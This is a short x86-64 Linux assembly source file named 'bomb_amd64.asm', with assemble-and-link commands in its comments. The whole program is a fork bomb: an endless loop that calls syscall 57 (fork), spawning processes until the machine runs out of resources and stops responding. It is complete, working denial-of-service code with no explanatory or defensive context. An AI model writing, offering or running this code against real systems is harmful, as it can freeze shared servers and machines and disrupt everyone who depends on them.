; nasm -f elf64 -o bomb_amd64.o bomb_amd64.asm
; ld -o bomb_amd64 bomb_amd64.o
section .text
    global _start

_start:
loop:
    mov rax, 57
    syscall
    jmp loop